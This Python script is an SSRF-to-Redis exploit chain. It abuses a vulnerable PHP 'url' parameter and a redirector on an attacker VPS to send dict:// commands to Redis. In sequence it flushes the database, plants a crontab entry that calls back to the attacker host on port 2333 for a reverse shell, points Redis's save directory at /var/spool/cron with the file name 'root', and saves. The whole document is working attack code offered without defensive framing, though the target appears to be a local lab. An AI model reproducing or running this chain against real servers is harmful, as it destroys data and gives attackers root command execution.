import requests

host = '127.0.0.1'
port = '6379'

vul_httpurl = "http://127.0.0.1:7777/index.php?url="

_location = "http://VPS:7777/302.php"

shell_location = "http://VPS:7777/shell.php"

#1 flush db
scheme = "dict"
ip = "docker.for.mac.host.internal"
port = 6379
bhost = "VPS"
bport = 2333
_payload = '?scheme={scheme}%26ip={ip}%26port={port}%26data=flushall'.format(
	scheme = scheme,
	ip = ip,
	port = port
	)

exp_uri = '{vul_httpurl}{location}{payload}'.format(
	vul_httpurl = vul_httpurl,
	location = _location,
	payload = _payload
	)

print(exp_uri)
print(len(requests.get(exp_uri).text))

#2 set crontab command
_payload = '?scheme={scheme}%26ip={ip}%26port={port}%26bhost={bhost}%26bport={bport}'.format(
	scheme = scheme,
	ip = ip,
	port = port,
	bhost = bhost,
	bport = bport
	)

exp_uri = '{vul_httpurl}{shell_location}{payload}'.format(
	vul_httpurl = vul_httpurl,
	shell_location = shell_location,
	payload = _payload
	) 

print(exp_uri)
print(requests.get(exp_uri).text)

#3 config set dir
_payload = '?scheme={scheme}%26ip={ip}%26port={port}%26data=config:set:dir:/var/spool/cron'.format(
	scheme = scheme,
	ip = ip,
	port = port
	)

exp_uri = '{vul_httpurl}{location}{payload}'.format(
	vul_httpurl = vul_httpurl,
	location = _location,
	payload = _payload
	)

print(exp_uri)
print(requests.get(exp_uri).text)

#3 config set dbfilename
_payload = '?scheme={scheme}%26ip={ip}%26port={port}%26data=config:set:dbfilename:root'.format(
	scheme = scheme,
	ip = ip,
	port = port
	)

exp_uri = '{vul_httpurl}{location}{payload}'.format(
	vul_httpurl = vul_httpurl,
	location = _location,
	payload = _payload
	)

print(exp_uri)
print(requests.get(exp_uri).text)

#4 save
_payload = '?scheme={scheme}%26ip={ip}%26port={port}%26data=save'.format(
	scheme = scheme,
	ip = ip,
	port = port
	)

exp_uri = '{vul_httpurl}{location}{payload}'.format(
	vul_httpurl = vul_httpurl,
	location = _location,
	payload = _payload
	)

print(exp_uri)
print(requests.get(exp_uri).text)